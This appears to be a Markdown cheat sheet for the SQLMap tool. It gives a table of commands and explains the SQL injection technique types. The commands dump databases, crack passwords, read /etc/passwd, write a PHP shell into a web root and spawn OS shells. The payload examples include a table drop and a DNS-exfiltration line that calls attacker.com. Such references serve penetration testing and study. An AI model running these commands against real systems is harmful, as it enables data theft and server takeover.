# <a id="top-of-page"></a> SQLMap

### Links

- [Basic Command List](#comms)
- [General SQLMap Information](#gen-info)
  - [SQLMap Main Features](#main-feats)
  - [SQLMap Supported DB's](#supp-dbs)
  - [SQLMap Support Injection Types](#sqli-types)

---

# <a id="comms"></a> Basic Command List

| **Command**                                                                                                               | **Description**                                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                                                                                                                                               |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                                                                                                                                               |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk                                                                                                                              |
| `sqlmap 'http://www.example.com/' --crawl=1 -crawl-exclude="logout"`                                                      | Crawl site, specify directory depth, and exclude certain pages                                                                                                                           |
| `sqlmap 'http://www.example.com/' --proxy="http://localhost:8080"`                                                        | Send SQLMap through proxy (Burp/ZAP)                                                                                                                                                     |
| `sqlmap 'http://www.example.com/' --tor`                                                                                  | Send traffic through default TOR network                                                                                                                                                 |
| `sqlmap 'http://www.example.com/' --user-agent=<something> OR --random-agent`                                             | Change useragent from SQLMap default either manually or randomly                                                                                                                         |
| `sqlmap 'http://www.example.com/' --forms`                                                                                | Parse and test forms on App                                                                                                                                                              |
| `sqlmap 'http://www.example.com/' --referer="http://example.com/index.php"`                                               | Define what referer is being used for WAF avoidance                                                                                                                                      |
| `sqlmap 'http://www.example.com/' --dbms="sqllite"`                                                                       | Tell SQLMap what DBMS is in play for testing                                                                                                                                             |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                                                                                                                                                 |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                                                                                                                                               |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                                                                                                                                                 |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                                                                                                                                                          |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                                                                                                                                                  |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                                                                                                                                                            |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                                                                                                                                                            |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                                                                                                                                                     |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                                                                                                                                                        |
| `sqlmap 'http://www.example.com/' --dbs/--tables/--columns`                                                               | Switches that provide a more tactical way of getting data besides dumping the entire DB. Can be coupled with -D/-T to for example list only tables in Customer DB (-D Customer --tables) |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                                                                                                                                                    |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                                                                                                                                                  |
| `sqlmap -u "http://www.example.com/?id=1" --schema --exclude-sysdbs`                                                      | Dump the entire DBMS (table & column) but exclude system databases                                                                                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                                                                                                                                                       |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                                                                                                                                                        |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                                                                                                                                                   |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                                                                                                                                                  |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                                                                                                                                                 |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                                                                                                                                                     |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                                                                                                                                                           |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                                                                                                                                                     |

[Back to top](#top-of-page)

</br>

# <a id="gen-info"></a> General SQLMap Information

## <a id="main-feats"></a> -SQLMap Main Features-

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:

- Target connection
- Enumeration
- Database content retrieval
- Injection Detection
- Optimization
- File System Access
- Fingerprinting
- Protection detection and bypass useing "tamper" scripts
- Execution of OS commands

## <a id="supp-dbs"></a> -SQLMap Supported DB's-

SQLMap comes with supported for numerous Database Management Systems (DBMS), with new ones added perodically. The current supported types are below:

- MySQL
- SQLite
- Sybase
- HSQLDB
- H2
- Vertica, Mckoi
- CrateDB
- Cubrid
- FrontBase
- Oracle
- IBM DB2
- SAP MaxDB
- CockroachDB
- MonetDB
- Presto
- Greenplum
- InterSystems Cache
- PostgreSQL
- Microsoft Access
- Informix
- TiDB
- Apache Derby
- Altibase
- Drizzle
- IRIS
- Microsoft SQL Server
- Firebird
- MariaDB
- MemSQL
- Amazon Redshift
- MimerSQL
- Apache Ignite
- eXtremeDB

## <a id="sqli-types"></a> -SQLMap Supported SQLi Types-

SQLMap comes with six types of SQL Injection attacks using the technique characters `BEUSTQ`. SQLMap also supportes 'Out-of-band SQL Injection' through DNS exfiltration which is considered one of the most advanced types of SQLi.

| **Technique** | **Example**                                                       | **Description**     |
| ------------- | ----------------------------------------------------------------- | ------------------- |
| `B`           | `AND 1=1`                                                         | Boolean-based blind |
| `E`           | `AND GTID_SUBSET(@@version,0)`                                    | Error-based         |
| `U`           | `UNION ALL SELECT 1,@@version,3`                                  | Union query-based   |
| `S`           | `; DROP TABLE users`                                              | Stacked queries     |
| `T`           | `AND 1=IF(2>1,SLEEP(5),0)`                                        | Time-based blind    |
| `Q`           | `SELECT (SELECT @@version) from`                                  | Inline queries      |
| N/A           | `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))` | Out-of-band         |

### --Boolean-based Blind---

SQLMap exploits Boolean-based blind SQL Injection vulnerabilities through the differentiation of TRUE from FALSE query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned TRUE or FALSE. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

TRUE results are generally based on responses having none or marginal difference to the regular server response.

FALSE results are based on responses having substantial differences from the regular server response.

Boolean-based blind SQL Injection is considered as the most common SQLi type in web applications.

### --Error-based--

If the database management system (DBMS) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers Error-based SQL Injection for the following DBMSes:

- MsSQL
- MySQL
- PostgreSQL
- Sybase
- Firebird
- Oracle
- Vertica
- MonetDB
- IBM DB2

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

### ---UNION query-based---

With the usage of UNION, it is generally possible to extend the original (vulnerable) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

### ---Stacked Queries---

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. INSERT, UPDATE or DELETE), stacking must be supported by the vulnerable platform (e.g., Microsoft SQL Server and PostgreSQL support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.

### ---Time-based blind---

The principle of Time-based blind SQL Injection is similar to the Boolean-based blind SQL Injection, but here the response time is used as the source for the differentiation between TRUE or FALSE.

TRUE response is generally characterized by the noticeable difference in the response time compared to the regular server response

FALSE response should result in a response time indistinguishable from regular response times

Time-based blind SQL Injection is considerably slower than the boolean-based blind SQLi, since queries resulting in TRUE would delay the server response. This SQLi type is used in cases where Boolean-based blind SQL Injection is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. INSERT, UPDATE or DELETE), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as Boolean-based blind SQL Injection would not really work in this case.

### ---Inline Queries---

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

### --Out-of-band---

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. .attacker.com), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. foo.attacker.com), where foo would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the foo part, to form the entire SQL response.

[Back to top](#top-of-page)

</br>
